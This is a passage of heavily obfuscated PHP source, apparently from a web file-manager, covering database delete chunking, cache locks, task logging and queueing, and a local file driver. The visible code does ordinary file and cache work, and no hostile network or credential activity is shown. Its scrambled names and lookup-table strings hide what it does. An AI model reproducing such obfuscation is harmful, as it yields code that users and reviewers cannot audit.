array_merge($¾ºäÀÉ¿, $Ãñ´¿Óù); } return $¾ºäÀÉ¿; } public function delete($´ªıóÀÎ = array()) { $Ì¢ğŸÔ“ =& $_SERVER[óÔë„ú]; $•è·‰Û = self::SQL_WHERE_IN_CHUNK; $½ø¿ğÈÆ = $this->optionsValue(); $™©¹² = $this->findWhereField($½ø¿ğÈÆ); if (!$™©¹²) { return parent::delete($´ªıóÀÎ); } $‘àÀ‹’Û = 0; $ŒÆı´òÑ = $½ø¿ğÈÆ[$Ì¢ğŸÔ“[352]][$™©¹²][1]; $ŒÆı´òÑ = is_array($ŒÆı´òÑ) ? $ŒÆı´òÑ : array(); for ($¡Èµïªñ = 0; $¡Èµïªñ < count($ŒÆı´òÑ); $¡Èµïªñ += $•è·‰Û) { $ĞóèèĞë = array_slice($ŒÆı´òÑ, $¡Èµïªñ, $•è·‰Û); if (!is_array($ĞóèèĞë) || count($ĞóèèĞë) == 0) { break; } $½ø¿ğÈÆ[$Ì¢ğŸÔ“[352]][$™©¹²][1] = $ĞóèèĞë; $this->optionsValue($½ø¿ğÈÆ); $‘àÀ‹’Û += parent::delete($´ªıóÀÎ); } return $‘àÀ‹’Û; } private function findWhereField($€ÔùİÂ) { $ßûì’ÎÃ =& $_SERVER[óÔë„ú]; $Ùª à = self::SQL_WHERE_IN_CHUNK; if (!is_array($€ÔùİÂ) || !is_array($€ÔùİÂ[$ßûì’ÎÃ[352]])) { return !1; } foreach ($€ÔùİÂ[$ßûì’ÎÃ[352]] as $Å«€°õÇ => $Ö³»¢»®) { if (is_array($Ö³»¢»®) && isset($Ö³»¢»®[0]) && is_string($Ö³»¢»®[0]) && strtolower($Ö³»¢»®[0]) == $ßûì’ÎÃ[7] && is_array($Ö³»¢»®[1]) && count($Ö³»¢»®[1]) > $Ùª à) { ignore_timeout(); return $Å«€°õÇ; } } return !1; } public function setMasterDB($šªüêµ = true) { think_config($_SERVER[óÔë„ú][471], $šªüêµ); } } goto dß²¥¬¸¸ã; eÕ¼¶¤ìÂƒ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‘Ó¸“œ =& $_SERVER[óÔë„ú]; $£â”Íú’ = $GLOBALS[$‘Ó¸“œ[6]][$‘Ó¸“œ[425]]; self::$cachePath = $£â”Íú’[$‘Ó¸“œ[230]][$‘Ó¸“œ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($€ÕÄ, $ù„ÁîŸ = 0) { $ûÑ¾¨‚ª =& $_SERVER[óÔë„ú]; $¹–¡Ğƒ» = microtime(!0); $‡³ÖÅ·ü = $¹–¡Ğƒ» + $ù„ÁîŸ + 0.0001; $»ÈÓµ† = rtrim(self::$cachePath, $ûÑ¾¨‚ª[8]) . $ûÑ¾¨‚ª[923] . md5($€ÕÄ) . $ûÑ¾¨‚ª[920]; if (file_exists($»ÈÓµ†) && filemtime($»ÈÓµ†) && filemtime($»ÈÓµ†) < time() - 10) { @unlink($»ÈÓµ†); } do { if (file_exists($»ÈÓµ†)) { cacheLockWait(); continue; } $º‡­®…ó = fopen($»ÈÓµ†, $ûÑ¾¨‚ª[924]); if (!$º‡­®…ó) { return !1; } $‰ºóœøÇ = flock($º‡­®…ó, LOCK_EX | LOCK_NB); self::$caches[$€ÕÄ] = array($ûÑ¾¨‚ª[925] => $º‡­®…ó, $ûÑ¾¨‚ª[230] => $»ÈÓµ†); fwrite($º‡­®…ó, $‡³ÖÅ·ü); clearstatcache(); if ($º‡­®…ó && $‰ºóœøÇ) { return !0; } cacheLockWait(); } while (microtime(!0) < $‡³ÖÅ·ü); $this->unlock($€ÕÄ); return !1; } public function lockGet($Ù÷×ï) { $²¸À¸´ =& $_SERVER[óÔë„ú]; $õ¸øÂ­ç = rtrim(self::$cachePath, $²¸À¸´[8]) . $²¸À¸´[923] . md5($Ù÷×ï) . $²¸À¸´[920]; return file_exists($õ¸øÂ­ç); } public function unlock($ÎØƒØ«ú) { $íû›ä»· =& $_SERVER[óÔë„ú]; $£„À¸¬› = self::$caches[$ÎØƒØ«ú]; if (!$£„À¸¬›) { return; } @flock($£„À¸¬›[$íû›ä»·[925]], LOCK_UN); @fclose($£„À¸¬›[$íû›ä»·[925]]); @unlink($£„À¸¬›[$íû›ä»·[230]]); unset(self::$caches[$ÎØƒØ«ú]); } } class CacheLockRedis { public function lock($µÙÌš, $Œ³Šå‘” = 10) { $ƒºş÷¦× = Cache::init(); $ßùæ€¬Ç = microtime(!0) + $Œ³Šå‘”; while (microtime(!0) < $ßùæ€¬Ç) { $¥Á—ó®‰ = $ƒºş÷¦×->get($µÙÌš); if (!$¥Á—ó®‰) { $şÁ–Û•Ù = $ƒºş÷¦×->setLock($µÙÌš, $ßùæ€¬Ç, $Œ³Šå‘”); if ($şÁ–Û•Ù) { return !0; } } else { if ($¥Á—ó®‰ < microtime(!0)) { $ƒºş÷¦×->set($µÙÌš, $ßùæ€¬Ç, $Œ³Šå‘” * 2); if ($ƒºş÷¦×->get($µÙÌš) === $¥Á—ó®‰) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ŠûÕˆĞ¨) { return Cache::init()->get($ŠûÕˆĞ¨); } public function unlock($ëî¾¸”) { return Cache::init()->remove($ëî¾¸”); } } class CacheLockMemcached { public function lock($—öç÷Ğ, $¦šìù = 0) { $ Ü€‘¹¸ = Cache::init(); $…ŠÆòá = microtime(!0) + $¦šìù; while (microtime(!0) < $…ŠÆòá) { $£êşÁïê = $ Ü€‘¹¸->get($—öç÷Ğ); if (!$£êşÁïê || $£êşÁïê < microtime(!0)) { $±‰äÓ£¸ = $ Ü€‘¹¸->handle->add($—öç÷Ğ, $…ŠÆòá, $¦šìù); if ($±‰äÓ£¸) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ş×°Íâ”) { return Cache::init()->get($ş×°Íâ”); } public function unlock($ªÍƒ¯±) { return Cache::init()->remove($ªÍƒ¯±); } } goto c§õñÎßÏÂ; D¯ğ Ñˆ² : class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($©ééšê¦, $İ™¢‚ = '', $ïúÁàÚ½ = 0, $û•¬¾‰· = '') { $—ªàÊ‚Ë =& $_SERVER[óÔë„ú]; $û•¬¾‰· = $û•¬¾‰· ? $û•¬¾‰· : ($İ™¢‚ ? $İ™¢‚ : $©ééšê¦); $é­Ü»©ü = new Task($©ééšê¦, $İ™¢‚, $ïúÁàÚ½, $û•¬¾‰·); $GLOBALS[$—ªàÊ‚Ë[1841] . $©ééšê¦] = new TaskLog($—ªàÊ‚Ë[1742], $é­Ü»©ü, $û•¬¾‰·); return $é­Ü»©ü; } public function __construct($¬ÈÒ ã¬ = '', $ÙÇ©‘È£ = '', $²ø¤í© = '') { $øã¾ÈØ =& $_SERVER[óÔë„ú]; if (!$¬ÈÒ ã¬) { $¬ÈÒ ã¬ = $øã¾ÈØ[1742]; } $²¨©è¼è = $¬ÈÒ ã¬ . $øã¾ÈØ[462] . rand_string(10); if (!$²ø¤í©) { $²ø¤í© = $¬ÈÒ ã¬ . $øã¾ÈØ[53] . $²ø¤í©; } switch ($¬ÈÒ ã¬) { case $øã¾ÈØ[1742]: if (!$ÙÇ©‘È£ || !$ÙÇ©‘È£->task) { return echoLog($¬ÈÒ ã¬ . $øã¾ÈØ[1842]); } $§‚£¦Ü = $ÙÇ©‘È£; $²¨©è¼è = $§‚£¦Ü->task[$øã¾ÈØ[475]]; $¬ÈÒ ã¬ = $§‚£¦Ü->task[$øã¾ÈØ[475]]; if (!$§‚£¦Ü->task[$øã¾ÈØ[1647]]) { $§‚£¦Ü->task[$øã¾ÈØ[1647]] = $²ø¤í© ? $²ø¤í© : $¬ÈÒ ã¬; } break; case $øã¾ÈØ[1843]: if (!$ÙÇ©‘È£) { return echoLog($¬ÈÒ ã¬ . $øã¾ÈØ[1844]); } $É«£ú ö = is_string($ÙÇ©‘È£) ? array($ÙÇ©‘È£) : $ÙÇ©‘È£; $§‚£¦Ü = new TaskFileTransfer($²¨©è¼è, $¬ÈÒ ã¬, 0, $²ø¤í© ? $²ø¤í© : $É«£ú ö[0]); foreach ($É«£ú ö as $âäµü¬£) { $§‚£¦Ü->addPath($âäµü¬£); } break; case $øã¾ÈØ[389]: if (!$ÙÇ©‘È£) { return echoLog($¬ÈÒ ã¬ . $øã¾ÈØ[1844]); } $É«£ú ö = is_string($ÙÇ©‘È£) ? array($ÙÇ©‘È£) : $ÙÇ©‘È£; $§‚£¦Ü = new TaskZip($²¨©è¼è, $¬ÈÒ ã¬, 0, $²ø¤í© ? $²ø¤í© : $É«£ú ö[0]); foreach ($É«£ú ö as $âäµü¬£) { $§‚£¦Ü->addPath($âäµü¬£); } break; case $øã¾ÈØ[1286]: if (!$ÙÇ©‘È£) { return echoLog($¬ÈÒ ã¬ . $øã¾ÈØ[1844]); } $§‚£¦Ü = new TaskUnZip($²¨©è¼è, $¬ÈÒ ã¬, 0, $²ø¤í© ? $²ø¤í© : $ÙÇ©‘È£); if ($ÙÇ©‘È£) { $§‚£¦Ü->addFile($ÙÇ©‘È£); } break; case $øã¾ÈØ[152]: $§‚£¦Ü = new TaskHttp($²¨©è¼è, $¬ÈÒ ã¬); break; default: return; break; } $this->task = $§‚£¦Ü; $this->taskID = $²¨©è¼è; Hook::bind($øã¾ÈØ[1779], array($this, $øã¾ÈØ[1845])); Hook::bind($øã¾ÈØ[1781], array($this, $øã¾ÈØ[1846])); Hook::bind($øã¾ÈØ[1775], array($this, $øã¾ÈØ[1847])); echoLog($øã¾ÈØ[1848] . $§‚£¦Ü->task[$øã¾ÈØ[1647]]); } public function __destruct() { $this->end(); } public function end($»û‘êõÔ = '') { $¤öµáÏµ =& $_SERVER[óÔë„ú]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($»û‘êõÔ); $this->task = !1; $this->taskID = !1; Hook::unbind($¤öµáÏµ[1779], array($this, $¤öµáÏµ[1845])); Hook::unbind($¤öµáÏµ[1781], array($this, $¤öµáÏµ[1846])); Hook::unbind($¤öµáÏµ[1775], array($this, $¤öµáÏµ[1847])); } public function taskUpdate($¹¢¾Èö) { $éŸ„Ä”‚ =& $_SERVER[óÔë„ú]; if (!$¹¢¾Èö || $this->taskID != $¹¢¾Èö[$éŸ„Ä”‚[475]]) { return; } $Ö—à¯ÖÈ = 20; $©®Ÿş„» = intval($¹¢¾Èö[$éŸ„Ä”‚[1760]] * $Ö—à¯ÖÈ); $Ìó™€Ü = $éŸ„Ä”‚[176] . str_repeat($éŸ„Ä”‚[947], $©®Ÿş„») . $éŸ„Ä”‚[1077] . str_repeat($éŸ„Ä”‚[53], $Ö—à¯ÖÈ - $©®Ÿş„») . $éŸ„Ä”‚[178]; $¬Ó¸ûØ” = $Ìó™€Ü . sprintf($éŸ„Ä”‚[1849], $¹¢¾Èö[$éŸ„Ä”‚[1760]] * 100) . $éŸ„Ä”‚[1850]; $ï£ä²Ğ = $¬Ó¸ûØ” . $¹¢¾Èö[$éŸ„Ä”‚[1759]] . $éŸ„Ä”‚[8] . $¹¢¾Èö[$éŸ„Ä”‚[1126]] . LNG($éŸ„Ä”‚[1851]); $Ê¸¶±Îµ = $éŸ„Ä”‚[12]; if ($¹¢¾Èö[$éŸ„Ä”‚[1835]]) { $ï£ä²Ğ = $¬Ó¸ûØ” . size_format($¹¢¾Èö[$éŸ„Ä”‚[1759]]) . $éŸ„Ä”‚[8] . size_format($¹¢¾Èö[$éŸ„Ä”‚[1126]]); $Ê¸¶±Îµ = size_format($¹¢¾Èö[$éŸ„Ä”‚[1761]]) . $éŸ„Ä”‚[1852]; } if ($¹¢¾Èö[$éŸ„Ä”‚[1128]]) { $¹¢¾Èö[$éŸ„Ä”‚[1809]] = $¹¢¾Èö[$éŸ„Ä”‚[1128]] . $éŸ„Ä”‚[53] . $¹¢¾Èö[$éŸ„Ä”‚[1809]]; } if ($¹¢¾Èö[$éŸ„Ä”‚[1809]]) { $ÚÆ–æåâ = $éŸ„Ä”‚[12]; if ($¹¢¾Èö[$éŸ„Ä”‚[1811]]) { $ÚÆ–æåâ = $éŸ„Ä”‚[50] . size_format($¹¢¾Èö[$éŸ„Ä”‚[1812]]) . $éŸ„Ä”‚[8] . size_format($¹¢¾Èö[$éŸ„Ä”‚[1811]]); } $Ê¸¶±Îµ .= $¹¢¾Èö[$éŸ„Ä”‚[1809]] . $ÚÆ–æåâ; } if ($¹¢¾Èö[$éŸ„Ä”‚[823]] && !$¹¢¾Èö[$éŸ„Ä”‚[1811]]) { $Ê¸¶±Îµ .= $éŸ„Ä”‚[53] . size_format($¹¢¾Èö[$éŸ„Ä”‚[1816]]) . $éŸ„Ä”‚[8] . size_format($¹¢¾Èö[$éŸ„Ä”‚[823]]); } echoLog($ï£ä²Ğ . $éŸ„Ä”‚[53] . $Ê¸¶±Îµ, !0); } public function taskEnd($å­èïß…) { $Şó× =& $_SERVER[óÔë„ú]; if (!$å­èïß… || $this->taskID != $å­èïß…[$Şó×[475]]) { return; } $¡»¿À•å = $å­èïß… ? $å­èïß…[$Şó×[1759]] . $Şó×[8] . $å­èïß…[$Şó×[1126]] . LNG($Şó×[1851]) . $Şó×[74] : $Şó×[12]; echoLog($Şó×[1853] . $å­èïß…[$Şó×[1647]] . ($å­èïß…[$Şó×[526]] ? $Şó×[74] . $å­èïß…[$Şó×[526]] : $Şó×[12]) . $Şó×[74] . $¡»¿À•å . $Şó×[1854] . sprintf($Şó×[910], timeFloat() - $å­èïß…[$Şó×[1762]]) . $Şó×[1774]); $this->end(); } public function taskKill($•ôÑĞéÒ) { $ùú»øÁâ =& $_SERVER[óÔë„ú]; if (!$•ôÑĞéÒ || $this->taskID != $•ôÑĞéÒ[$ùú»øÁâ[475]]) { return; } echoLog($ùú»øÁâ[1855] . $•ôÑĞéÒ[$ùú»øÁâ[1647]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\x75\x65\165\x65\114\x65\x6e\147\164\x68"; const QUEUE_DATA = "\x74\x61\x73\153\x51\165\x65\x75\x65\x44\141\x74\141"; const QUEUE_TIME = "\164\x61\163\153\121\x75\145\165\145\114\x61\x73\x74\122\x75\156"; const QUEUE_THREAD = "\164\141\163\x6b\121\165\x65\165\145\124\150\x72\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÄÎêÏà¥, $¢—¾º¨˜ = array(), $…•šíàã = '', $‹‘öÜ¹ü = '') { $úæ¸æ =& $_SERVER[óÔë„ú]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($‹‘öÜ¹ü && array_find_by_field(self::$listData, $úæ¸æ[97], $‹‘öÜ¹ü)) { return !0; } if ($‹‘öÜ¹ü && array_find_by_field(self::$listDataAdd, $úæ¸æ[97], $‹‘öÜ¹ü)) { return !0; } self::$listDataAdd[] = array($úæ¸æ[341] => $ÄÎêÏà¥, $úæ¸æ[1856] => $¢—¾º¨˜, $úæ¸æ[526] => $…•šíàã, $úæ¸æ[97] => $‹‘öÜ¹ü); return !0; } public static function addSubmit() { $øË—öÖ’ =& $_SERVER[óÔë„ú]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($øË—öÖ’[1857] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $øË—öÖ’[12], $øË—öÖ’[526])), $øË—öÖ’[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ØÅßÉè, $í°Á²ù = array(), $¦‘§Ë = '', $å†˜ÂŞØ = '') { $¬øçÍÕ› =& $_SERVER[óÔë„ú]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¬…ïûı™ = self::getAll(); if ($å†˜ÂŞØ && array_find_by_field($¬…ïûı™, $¬øçÍÕ›[97], $å†˜ÂŞØ)) { return !0; } $¬…ïûı™[] = array($¬øçÍÕ›[341] => $ØÅßÉè, $¬øçÍÕ›[1856] => $í°Á²ù, $¬øçÍÕ›[526] => $¦‘§Ë, $¬øçÍÕ›[97] => $å†˜ÂŞØ); self::setAll($¬…ïûı™); write_log($¬øçÍÕ›[1857] . $¦‘§Ë, $¬øçÍÕ›[197]); return !0; } public static function run() { $¡³’í„ô =& $_SERVER[óÔë„ú]; $Ğ¦Ò¾ = self::getAll(); $‰Ä¨çîŒ = array_shift($Ğ¦Ò¾); if (!$‰Ä¨çîŒ) { return !1; } self::setAll($Ğ¦Ò¾); $Ó›““… = timeFloat(); $¿üÕ‘”Â = $¡³’í„ô[12]; try { $¿üÕ‘”Â = Hook::apply($‰Ä¨çîŒ[$¡³’í„ô[341]], $‰Ä¨çîŒ[$¡³’í„ô[1856]]); } catch (Exception $Ğ¼üÂÃé) { write_log($Ğ¼üÂÃé, $¡³’í„ô[1249]); } $æ¼¬¤¡ = number_format(timeFloat() - $Ó›““…, 3) . $¡³’í„ô[1774]; if ($¿üÕ‘”Â && is_string($¿üÕ‘”Â)) { $æ¼¬¤¡ = $æ¼¬¤¡ . $¡³’í„ô[1858] . $¿üÕ‘”Â; } write_log($¡³’í„ô[1859] . $‰Ä¨çîŒ[$¡³’í„ô[526]] . $¡³’í„ô[1860] . $æ¼¬¤¡, $¡³’í„ô[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ìÔÂ¿î =& $_SERVER[óÔë„ú]; $´“¾©Ã = self::threadCount() + 1; if ($´“¾©Ã > 3 || !self::count()) { return; } write_log($ìÔÂ¿î[1861] . $´“¾©Ã, $ìÔÂ¿î[197]); Cache::set(self::QUEUE_THREAD, $´“¾©Ã, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ìÔÂ¿î[1862], $ìÔÂ¿î[197]); } public static function getKey($µôî³ä¦, $Ñ½Ğ¬Ş‚ = "\151\156\x74") { $ı²“«‰š =& $_SERVER[óÔë„ú]; Cache::removeMemory($µôî³ä¦); $Óòö€¡ö = Cache::get($µôî³ä¦); if ($Ñ½Ğ¬Ş‚ == $ı²“«‰š[364]) { return $Óòö€¡ö ? intval($Óòö€¡ö) : 0; } if ($Ñ½Ğ¬Ş‚ == $ı²“«‰š[1863]) { return is_array($Óòö€¡ö) ? $Óòö€¡ö : array(); } return $Óòö€¡ö; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[óÔë„ú][1863]); } public static function setAll($æÑè©­š) { $™À¡°» = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($æÑè©­š), $™À¡°»); Cache::set(self::QUEUE_DATA, $æÑè©­š, $™À¡°»); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ş„ä³à, $íò°İÍ = 5.0) { if (!$Ş„ä³à) { return; } $Â¯£ìá‰ = Cache::get($Ş„ä³à); if (!$Â¯£ìá‰ || timeFloat() - floatVal($Â¯£ìá‰) >= $íò°İÍ) { Cache::set($Ş„ä³à, timeFloat(), $íò°İÍ * 10); return !0; } return !1; } public static function timeLimitCall($Ä˜ÂæÏ, $Ù§…Ôâƒ, $ªª½ÊÁğ, $®¢§Üï“ = 5.0) { $æ°È¸Ğò =& $_SERVER[óÔë„ú]; if (!$Ä˜ÂæÏ || !$Ù§…Ôâƒ) { return; } self::$asyncAdd = !0; $êÅ†×½Á = $æ°È¸Ğò[1864]; $Ê—¹²Îò = Cache::get($êÅ†×½Á, !0); $ïÊÇ½©ê = array($æ°È¸Ğò[1865] => timeFloat(), $æ°È¸Ğò[1866] => timeFloat(), $æ°È¸Ğò[341] => $Ù§…Ôâƒ, $æ°È¸Ğò[1856] => $ªª½ÊÁğ, $æ°È¸Ğò[206] => $®¢§Üï“); if (is_array($Ê—¹²Îò[$Ä˜ÂæÏ])) { $ïÊÇ½©ê[$æ°È¸Ğò[1866]] = $Ê—¹²Îò[$Ä˜ÂæÏ][$æ°È¸Ğò[1866]]; } if (is_array($Ê—¹²Îò[$Ä˜ÂæÏ])) { if (timeFloat() - $Ê—¹²Îò[$Ä˜ÂæÏ][$æ°È¸Ğò[1865]] < $ïÊÇ½©ê[$æ°È¸Ğò[206]] * 0.3) { return; } $ïÊÇ½©ê[$æ°È¸Ğò[1866]] = $Ê—¹²Îò[$Ä˜ÂæÏ][$æ°È¸Ğò[1866]]; } $Ê—¹²Îò[$Ä˜ÂæÏ] = $ïÊÇ½©ê; Cache::set($êÅ†×½Á, $Ê—¹²Îò, 60); Cache::removeMemory($êÅ†×½Á); write_log($æ°È¸Ğò[1867] . $Ä˜ÂæÏ . $æ°È¸Ğò[74] . $Ù§…Ôâƒ, $æ°È¸Ğò[197]); } public static function timeLimitCallLoop() { $ÅŸû§¢ =& $_SERVER[óÔë„ú]; $¹“ªä¹º = array($ÅŸû§¢[1868]); $—–Õë‹§ = in_array(strtolower(ACTION), $¹“ªä¹º); if (!$—–Õë‹§ && !self::$asyncAdd) { return; } $­ìóº‹¹ = $ÅŸû§¢[1864]; $Î”¤ÊŞ  = Cache::get($­ìóº‹¹, !0); if (!$Î”¤ÊŞ  || count($Î”¤ÊŞ ) <= 0) { return; } $œÌÅÖ³æ = !1; $­†”×Ò² = timeFloat(); $ğ¸À¶ü² = array(); foreach ($Î”¤ÊŞ  as $Ô­œµ…² => $íí¤Ç”Ü) { if ($­†”×Ò² - $íí¤Ç”Ü[$ÅŸû§¢[1866]] > $íí¤Ç”Ü[$ÅŸû§¢[206]]) { $œÌÅÖ³æ = !0; try { Hook::apply($íí¤Ç”Ü[$ÅŸû§¢[341]], $íí¤Ç”Ü[$ÅŸû§¢[1856]]); write_log($ÅŸû§¢[1869] . $Ô­œµ…² . $ÅŸû§¢[74] . $íí¤Ç”Ü[$ÅŸû§¢[341]] . $ÅŸû§¢[1870] . ACTION, $ÅŸû§¢[197]); } catch (Exception $š§ÉÃ›Ä) { } continue; } $ğ¸À¶ü²[$Ô­œµ…²] = $íí¤Ç”Ü; } if (!$œÌÅÖ³æ) { return; } if (!$ğ¸À¶ü²) { return Cache::remove($­ìóº‹¹); } Cache::set($­ìóº‹¹, $ğ¸À¶ü², 60); Cache::removeMemory($­ìóº‹¹); } public static function finished($ø‡ÀÒÕÔ, $÷¦©„ãŠ) { $Á£Ì†‰í =& $_SERVER[óÔë„ú]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Á£Ì†‰í[341] => $ø‡ÀÒÕÔ, $Á£Ì†‰í[1856] => $÷¦©„ãŠ); } private static function finishedRun() { $ ¤§ùÏá =& $_SERVER[óÔë„ú]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¢’ºòæŠ) { try { Hook::apply($¢’ºòæŠ[$ ¤§ùÏá[341]], $¢’ºòæŠ[$ ¤§ùÏá[1856]]); } catch (Exception $æ—Ñ€Ø‹) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto cÃ¹Í¼“¦Ğ; e“‚ËÎ©‹é: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($øÒìÍÏ´) { if (substr($øÒìÍÏ´, 0, 2) == $_SERVER[óÔë„ú][1397]) { $øÒìÍÏ´ = BASIC_PATH . substr($øÒìÍÏ´, 2); } return $øÒìÍÏ´; } public function iconvApp($·œÑ¥´ê) { $Õœï•¤Ã =& $_SERVER[óÔë„ú]; global $config; return $this->iconvTo($·œÑ¥´ê, $config[$Õœï•¤Ã[1424]], $config[$Õœï•¤Ã[1423]]); } public function iconvSystem($ÉÉ‰‡ˆÖ) { $µ¦•·ÇÙ =& $_SERVER[óÔë„ú]; global $config; return $this->iconvTo($ÉÉ‰‡ˆÖ, $config[$µ¦•·ÇÙ[1423]], $config[$µ¦•·ÇÙ[1424]]); } public function getPathOuter($Å‰‚¬‚) { $«Áñ“¸ =& $_SERVER[óÔë„ú]; $¢Æ¯­½ë = $this->iconvApp($this->pathBase); $Å‰‚¬‚ = $this->iconvApp($Å‰‚¬‚); if (substr($¢Æ¯­½ë, 0, 2) == $«Áñ“¸[1397]) { $¢Æ¯­½ë = BASIC_PATH . substr($¢Æ¯­½ë, 2); } if (substr($Å‰‚¬‚, 0, 2) == $«Áñ“¸[1397]) { $Å‰‚¬‚ = BASIC_PATH . substr($Å‰‚¬‚, 2); } $¢Æ¯­½ë = KodIO::clear($¢Æ¯­½ë); $Å‰‚¬‚ = KodIO::clear($Å‰‚¬‚); $Å‰‚¬‚ = substr($Å‰‚¬‚, strlen($¢Æ¯­½ë)); if (empty($this->pathDriver)) { return $Å‰‚¬‚; } return $this->pathDriver . $«Áñ“¸[8] . ltrim($Å‰‚¬‚, $«Áñ“¸[8]); } public function mkfile($®‘•¬¸˜, $¨¢öÔöµ = '', $íÚÀù«É = REPEAT_RENAME) { $®‘•¬¸˜ = $this->iconvSystem($®‘•¬¸˜); @touch($®‘•¬¸˜); if ($¨¢öÔöµ) { file_put_contents($®‘•¬¸˜, $¨¢öÔöµ); } @chmod($®‘•¬¸˜, $this->pathAuth); if (is_file($®‘•¬¸˜)) { return $this->getPathOuter($®‘•¬¸˜); } $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); return !1; } public function mkdir($ß¬Šµëê, $ïÎ®ŠŞ = REPEAT_SKIP) { $ß¬Šµëê = $this->iconvSystem($ß¬Šµëê); if (is_dir($ß¬Šµëê)) { return $this->getPathOuter($ß¬Šµëê); } @mkdir($ß¬Šµëê, $this->pathAuth, !0); @chmod($ß¬Šµëê, $this->pathAuth); if (is_dir($ß¬Šµëê)) { return $this->getPathOuter($ß¬Šµëê); } $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); return !1; } public function copyFile($é²Ü¿›ª, $²¬Éñú¡) { $this->mkdir($this->pathFather($²¬Éñú¡)); $é²Ü¿›ª = $this->iconvSystem($é²Ü¿›ª); $²¬Éñú¡ = $this->iconvSystem($²¬Éñú¡); $ÒÎ®Ú—‚ = copy_64($é²Ü¿›ª, $²¬Éñú¡); @chmod($²¬Éñú¡, $this->pathAuth); if ($ÒÎ®Ú—‚) { return $this->getPathOuter($²¬Éñú¡); } $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); return !1; } public function moveFile($Ÿ‰è™ËÁ, $•Ç´¼ë«) { $this->mkdir($this->pathFather($•Ç´¼ë«)); $Ÿ‰è™ËÁ = $this->iconvSystem($Ÿ‰è™ËÁ); $•Ç´¼ë« = $this->iconvSystem($•Ç´¼ë«); $–¸äìâë = intval(@rename($Ÿ‰è™ËÁ, $•Ç´¼ë«)); if (!$–¸äìâë) { if ($–¸äìâë = intval(@copy_64($Ÿ‰è™ËÁ, $•Ç´¼ë«))) { @unlink($Ÿ‰è™ËÁ); } } @chmod($•Ç´¼ë«, $this->pathAuth); if ($–¸äìâë) { return $this->getPathOuter($•Ç´¼ë«); } $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); return !1; } public function movePath($„ªÊ¸†, $ùüÔÍ£›, $ú¯œşá¤ = false) { $‚¶çÔâ¢ =& $_SERVER[óÔë„ú]; $„ªÊ¸† = $this->iconvSystem($„ªÊ¸†); $ùüÔÍ£› = $this->iconvSystem($ùüÔÍ£›); $¨Ó™©ó· = rtrim($ùüÔÍ£›, $‚¶çÔâ¢[8]) . $‚¶çÔâ¢[8] . ($ú¯œşá¤ ? $ú¯œşá¤ : get_path_this($„ªÊ¸†)); if (file_exists($¨Ó™©ó·)) { return !1; } $¾¬©¡„³ = intval(@rename($„ªÊ¸†, $¨Ó™©ó·)); $¾¬©¡„³ = file_exists($¨Ó™©ó·); if ($¾¬©¡„³) { return $this->getPathOuter($¨Ó™©ó·); } $this->writeLog(__FUNCTION__ . $‚¶çÔâ¢[1435], !0); return !1; } public function delFile($úÂ½¸í) { $úÂ½¸í = $this->iconvSystem($úÂ½¸í); if (!@unlink($úÂ½¸í)) { @chmod($úÂ½¸í, $this->pathAuth); if (@unlink($úÂ½¸í)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); return !1; } return !0; } public function delFolder($¬û½Ø¿÷) { $¨–„ÛºÅ =& $_SERVER[óÔë„ú]; $¬û½Ø¿÷ = $this->iconvSystem($¬û½Ø¿÷); if (!is_dir($¬û½Ø¿÷)) { return !0; } if (!($¿·‘ïô– = opendir($¬û½Ø¿÷))) { return !1; } while (($‘ÈÊˆÊ€ = readdir($¿·‘ïô–)) !== !1) { if ($‘ÈÊˆÊ€ == $¨–„ÛºÅ[10] || $‘ÈÊˆÊ€ == $¨–„ÛºÅ[1350]) { continue; } $Âª•¡Á† = $¬û½Ø¿÷ . $¨–„ÛºÅ[8] . $‘ÈÊˆÊ€; if (is_file($Âª•¡Á†) || is_link($Âª•¡Á†)) { if (!unlink($Âª•¡Á†)) { chmod($Âª•¡Á†, $this->pathAuth); if (!unlink($Âª•¡Á†)) { return !1; } } } else { if (is_dir($Âª•¡Á†)) { chmod($Âª•¡Á†, $this->pathAuth); $Âª•¡Á† = $this->iconvApp($Âª•¡Á†); if (!$this->delFolder($Âª•¡Á†)) { return !1; } } } } 